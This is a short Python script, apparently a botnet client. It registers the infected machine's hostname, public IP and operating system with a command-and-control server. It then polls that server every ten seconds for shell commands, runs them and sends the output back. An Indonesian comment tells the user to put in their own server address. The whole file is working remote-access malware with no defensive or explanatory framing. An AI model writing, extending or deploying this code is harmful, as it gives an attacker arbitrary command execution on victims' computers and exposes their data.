import requests
import subprocess
import time
import socket
import platform

# GANTI DENGAN IP SERVER LU
SERVER = "http://192.168.1.100:5000"
BOT_ID = socket.gethostname()

def register():
    try:
        data = {
            "bot_id": BOT_ID,
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "os": platform.platform()
        }
        requests.post(f"{SERVER}/api/register", json=data, timeout=10)
        print(f"[+] Registered: {BOT_ID}")
    except Exception as e:
        print(f"[-] Register failed: {e}")

def beacon():
    while True:
        try:
            resp = requests.get(f"{SERVER}/api/beacon/{BOT_ID}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('command'):
                    cmd = data['command']
                    print(f"[+] Command: {cmd}")
                    result = subprocess.getoutput(cmd)
                    requests.post(f"{SERVER}/api/report/{BOT_ID}", json={"output": result}, timeout=10)
        except Exception as e:
            pass
        time.sleep(10)

if __name__ == "__main__":
    register()
    beacon()
